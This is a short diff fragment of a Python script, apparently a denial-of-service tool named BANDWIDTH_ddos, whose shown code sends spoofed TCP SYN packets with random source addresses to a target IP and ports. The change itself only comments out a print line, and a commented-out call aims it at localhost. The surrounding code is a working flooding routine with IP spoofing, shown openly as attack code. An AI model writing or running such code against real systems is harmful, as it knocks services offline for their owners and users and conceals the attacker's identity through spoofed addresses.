@@ -23,7 +23,7 @@ def BANDWIDTH_ddos(targetIP, numPackets, ports, size=65495):
 
             # Send spoofed TCP SYN packet
             send(IP(src=randomIP(), dst=targetIP)/TCP(sport=spoof_port, dport=port)/payload, verbose=0)
-            print(f"Sent packet to {targetIP}:{port}")
+            #print(f"Sent packet to {targetIP}:{port}")
 
 
 #BANDWIDTH_ddos('127.0.0.1', 3, [80], 65495)
